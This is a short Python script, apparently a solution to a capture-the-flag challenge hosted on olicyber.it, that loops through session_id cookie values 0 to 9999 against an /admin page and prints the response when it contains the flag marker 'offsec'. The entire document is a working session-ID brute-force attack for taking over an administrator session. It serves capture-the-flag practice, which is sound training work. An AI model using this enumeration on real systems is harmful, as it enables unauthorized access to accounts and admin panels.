import requests
import json


for i in range(0,10000):
   
    cookie={
        "session_id":f"{i}"
    }
    url="http://too-small-reminder.challs.olicyber.it/admin"
    data=requests.get(url,cookies=cookie)
    print(f"\r{i}",end="")
    if "offsec" in data.text:
        print(data.text)
